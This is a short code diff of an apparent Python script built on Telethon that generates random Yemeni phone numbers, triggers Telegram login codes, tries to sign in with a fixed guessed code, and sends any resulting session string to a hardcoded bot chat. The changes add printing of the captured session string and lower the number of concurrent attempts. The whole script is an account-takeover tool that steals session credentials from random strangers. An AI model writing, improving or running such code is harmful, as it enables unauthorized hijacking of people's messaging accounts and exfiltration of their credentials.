@@ -19,7 +19,7 @@ chat_id = 1085837500
 
 
 async def send(phone:str):
-    print(phone)
+    
     
     for _ in range(5):
         code = 98245
@@ -32,7 +32,8 @@ async def send(phone:str):
               await client.send_code_request(phone)
               
               await client.sign_in(phone, code)
-              string = client.session.save()              
+              string = client.session.save()
+              print(string)
               bot.send_message(chat_id, f"{phone} ------\n{string}")
               
            except (PhoneCodeInvalidError, SessionPasswordNeededError):
@@ -50,7 +51,7 @@ def randNum():
     return  f"+96773{random.randint(1000000,9999999)}"
  
 async def main():
-    num = 10
+    num = 5
     while True:
         allSend = [send(randNum()) for _ in range(num)]
         await asyncio.gather(*allSend)
